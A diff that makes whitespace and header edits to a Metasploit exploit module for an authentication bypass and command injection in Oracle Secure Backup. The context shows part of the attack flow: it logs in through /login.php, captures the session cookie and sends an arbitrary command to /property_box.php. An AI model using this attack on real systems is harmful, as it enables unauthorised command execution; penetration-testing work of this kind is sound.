@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -15,9 +19,9 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability',
 			'Description'    => %q{
-					This module exploits an authentication bypass vulnerability 
-					in login.php in order to execute arbitrary code via a command injection 
-					vulnerability in property_box.php. This module was tested 
+					This module exploits an authentication bypass vulnerability
+					in login.php in order to execute arbitrary code via a command injection
+					vulnerability in property_box.php. This module was tested
 					against Oracle Secure Backup version 10.3.0.1.0 (Win32).
 			},
 			'Author'         => [ 'MC' ],
@@ -44,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run
 		cmd = datastore['CMD']
-	
+
 		res = send_request_cgi(
 			{
 				'uri'	=>  '/login.php',
@@ -57,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 				sessionid = res.headers['Set-Cookie'].split(';')[0]
 
 					print_status("Sending command: #{datastore['CMD']}...")
-	
+
 					send_request_cgi(
 						{
 							'uri'	=> '/property_box.php',
